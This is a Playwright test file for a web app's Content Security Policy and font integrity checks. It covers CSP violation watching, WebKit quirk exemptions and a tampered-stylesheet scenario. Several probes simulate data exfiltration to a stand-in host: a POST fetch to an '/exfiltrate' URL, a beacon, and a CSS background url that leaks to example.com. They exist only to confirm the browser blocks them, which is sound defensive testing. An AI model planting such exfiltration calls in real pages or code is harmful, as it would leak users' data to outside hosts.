import { readFile } from "node:fs/promises";
import { expect, test, type Page } from "@playwright/test";
import { importArchive } from "../e2e/helpers/responsive";
import { openSettingsCategory } from "../e2e/helpers/settings";
import { documentPolicy } from "../apps/web/security-policy.mjs";

type Violation = { directive: string; blocked: string; sample: string };

// Record every CSP violation the document reports, from the first script on.
const webkitSelectQuirk = (violation: Violation) =>
  violation.directive === "style-src-attr" &&
  violation.blocked === "inline" &&
  violation.sample === "";
const webkitSelectConsole =
  /^Refused to apply a stylesheet because its hash, its nonce, or 'unsafe-inline' does not appear in the style-src directive/;

async function watchViolations(page: Page, browserName: string) {
  await page.addInitScript(() => {
    const store: unknown[] = [];
    (window as unknown as { __cspViolations: unknown[] }).__cspViolations =
      store;
    // WebKit reports a style-src-attr violation for the user-agent shadow
    // tree of every <select> element (engine-internal, not page markup).
    // Count them so that exemption stays exact.
    const counter = window as unknown as { __selectCount: number };
    counter.__selectCount = 0;
    new MutationObserver((records) => {
      for (const record of records)
        for (const node of record.addedNodes)
          if (node instanceof Element)
            counter.__selectCount +=
              (node.matches("select") ? 1 : 0) +
              node.querySelectorAll("select").length;
    }).observe(document, { childList: true, subtree: true });
    document.addEventListener("securitypolicyviolation", (event) =>
      store.push({
        directive: event.effectiveDirective || event.violatedDirective,
        blocked: event.blockedURI,
        sample: event.sample,
      }),
    );
  });
  const consoleErrors: string[] = [];
  page.on("console", (message) => {
    if (message.type() === "error") consoleErrors.push(message.text());
  });
  page.on("pageerror", (error) => consoleErrors.push(error.message));
  let exempted = 0;
  return {
    violations: async () => {
      const { all, selects } = await page.evaluate(() => {
        const state = window as unknown as {
          __cspViolations: Violation[];
          __selectCount: number;
        };
        return { all: state.__cspViolations, selects: state.__selectCount };
      });
      if (browserName !== "webkit") return all;
      const quirks = all.filter(webkitSelectQuirk);
      // WebKit can report the UA-internal violation more than once per
      // <select> (each re-render restyles its shadow tree), so the count is
      // not bounded per element; it must never appear without a <select>.
      if (quirks.length) expect(selects).toBeGreaterThan(0);
      exempted = quirks.length;
      return all.filter((violation) => !webkitSelectQuirk(violation));
    },
    cspConsoleErrors: () => {
      const csp = consoleErrors.filter((text) =>
        /Content.Security.Policy|CSP|style-src|script-src|connect-src/i.test(
          text,
        ),
      );
      if (browserName !== "webkit") return csp;
      const quirks = csp.filter((text) => webkitSelectConsole.test(text));
      expect(quirks.length).toBeLessThanOrEqual(exempted);
      return csp.filter((text) => !webkitSelectConsole.test(text));
    },
    consoleErrors,
  };
}

test("production build enforces the documented policy @cross-browser", async ({
  page,
}) => {
  await page.goto("/");
  const meta = await page
    .locator('meta[http-equiv="Content-Security-Policy"]')
    .getAttribute("content");
  expect(meta).toBe(documentPolicy);
  // Inline script, eval and cross-origin connections are refused.
  const probes = await page.evaluate(async () => {
    const results: Record<string, string> = {};
    // eval()/Function() cannot be probed from page.evaluate (DevTools
    // evaluation bypasses CSP); scripts/check-security-headers.mjs proves the
    // shipped bundles never call them, so 'unsafe-eval' is not needed.
    const marker = "__inlineRan";
    const script = document.createElement("script");
    script.textContent = `window.${marker} = true`;
    document.head.append(script);
    results.inline = (window as unknown as Record<string, unknown>)[marker]
      ? "allowed"
      : "blocked";
    try {
      await fetch("https://example.com/exfiltrate", {
        method: "POST",
        body: "x",
      });
      results.fetch = "allowed";
    } catch {
      results.fetch = "blocked";
    }
    results.beacon = navigator.sendBeacon("https://example.com/b", "x")
      ? "queued"
      : "refused";
    return results;
  });
  expect(probes.inline).toBe("blocked");
  expect(probes.fetch).toBe("blocked");
});

test("the demo archive starts without CSP violations @cross-browser", async ({
  page,
  browserName,
}) => {
  const watch = await watchViolations(page, browserName);
  await page.route("https://cdn.jsdelivr.net/**", (route) => route.abort());
  await page.goto("/");
  await page.getByRole("button", { name: "Try demo", exact: true }).click();
  await expect(page.locator(".flight-row").first()).toBeVisible();
  expect(await watch.violations()).toEqual([]);
  expect(watch.cspConsoleErrors()).toEqual([]);
});

test("core journeys raise no CSP violation: import, Passport map/Globe, detail Globe, settings, export @cross-browser", async ({
  page,
  browserName,
}) => {
  test.setTimeout(120_000);
  const watch = await watchViolations(page, browserName);
  // Keep this journey independent of the optional font CDN (covered below).
  await page.route("https://cdn.jsdelivr.net/**", (route) => route.abort());

  await importArchive(page);
  await expect(
    page.locator(".passport-globe-frame, .route-map-canvas").first(),
  ).toBeVisible();
  await page
    .getByRole("button", { name: "Open UA123, SFO to LAX", exact: true })
    .click();
  await expect(page.locator("#flight-detail-title")).toBeVisible();
  await expect(page.locator(".detail-globe-frame .globe-host")).toHaveAttribute(
    "data-ready",
    "true",
    { timeout: 30_000 },
  );

  await page.goto("/#settings");
  await openSettingsCategory(page, "Data and backup");
  const download = page.waitForEvent("download");
  await page
    .getByRole("button", { name: "Export Keepraw Fly JSON", exact: true })
    .click();
  const file = await (await download).path();
  const exported = JSON.parse(await readFile(file!, "utf8"));
  expect(exported.format).toBe("keepraw-fly");

  // Locale resources are fetched on demand (connect-src 'self').
  await openSettingsCategory(page, "General");
  await page.locator(".settings-fields select").first().selectOption("ja-JP");
  await expect(page.locator("html")).toHaveAttribute("lang", "ja-JP");
  await page.goto("/#passport");
  await expect(page.locator(".flight-row").first()).toBeVisible();

  expect(await watch.violations()).toEqual([]);
  expect(watch.cspConsoleErrors()).toEqual([]);
});

test("MiSans stylesheets load with SRI under CSP and map their weights @cross-browser", async ({
  page,
  browserName,
}) => {
  test.setTimeout(90_000);
  const watch = await watchViolations(page, browserName);
  await importArchive(page);
  await page.goto("/#settings");
  await page.locator(".settings-fields select").first().selectOption("zh-CN");
  await page.goto("/#passport");
  const links = page.locator("link[data-chinese-webfont]");
  await expect(links).toHaveCount(3);
  await expect
    .poll(
      () =>
        links.evaluateAll((all) =>
          all.map((link) => (link as HTMLLinkElement).dataset.fontStatus),
        ),
      { timeout: 30_000 },
    )
    .toEqual(["loaded", "loaded", "loaded"]);
  const mapped = await links.evaluateAll((all) =>
    all.every((element) => {
      const link = element as HTMLLinkElement;
      return (
        link.integrity.startsWith("sha384-") &&
        link.crossOrigin === "anonymous" &&
        [...link.sheet!.cssRules].every(
          (rule) =>
            (rule as CSSFontFaceRule).style.fontFamily.replaceAll('"', "") ===
              link.dataset.fontFamily &&
            (rule as CSSFontFaceRule).style.fontWeight ===
              link.dataset.fontWeight,
        )
      );
    }),
  );
  expect(mapped).toBe(true);
  await expect(page.locator(".passport-map-title")).toHaveCSS(
    "font-family",
    /MiSans/,
  );
  expect(await watch.violations()).toEqual([]);
});

test("a tampered MiSans stylesheet is rejected by SRI and the UI falls back to system fonts @cross-browser", async ({
  page,
}) => {
  const served: string[] = [];
  await page.route(
    "https://cdn.jsdelivr.net/npm/misans-webfont@4.3.1/**/result.min.css",
    (route) => {
      served.push(route.request().url());
      return route.fulfill({
        status: 200,
        contentType: "text/css",
        headers: { "access-control-allow-origin": "*" },
        body: 'body { background: url("https://example.com/leak?x=1"); }',
      });
    },
  );
  await importArchive(page);
  await page.goto("/#settings");
  await page.locator(".settings-fields select").first().selectOption("zh-TW");
  await page.goto("/#passport");
  const links = page.locator("link[data-chinese-webfont]");
  await expect(links).toHaveCount(3);
  await expect
    .poll(() =>
      links.evaluateAll((all) =>
        all.map((link) => (link as HTMLLinkElement).dataset.fontStatus),
      ),
    )
    .toEqual(["unavailable", "unavailable", "unavailable"]);
  expect(served).toHaveLength(3);
  // The modified sheet was never applied (its body background is absent).
  expect(
    await page.evaluate(() => getComputedStyle(document.body).backgroundImage),
  ).toBe("none");
  await expect(page.locator(".flight-row").first()).toBeVisible();
  await expect(page.locator("html")).toHaveAttribute("lang", "zh-TW");
});

test("calibration: WebKit's <select> quirk is engine-internal, other engines report nothing", async ({
  page,
  browserName,
}) => {
  await page.goto("/");
  const count = await page.evaluate(async () => {
    let violations = 0;
    document.addEventListener("securitypolicyviolation", () => violations++);
    const select = document.createElement("select");
    select.append(new Option("x"));
    document.body.append(select);
    select.getBoundingClientRect();
    await new Promise((resolve) => setTimeout(resolve, 300));
    select.remove();
    return violations;
  });
  // If WebKit stops reporting this, remove the exemption in watchViolations.
  expect(count).toBe(browserName === "webkit" ? 1 : 0);
});
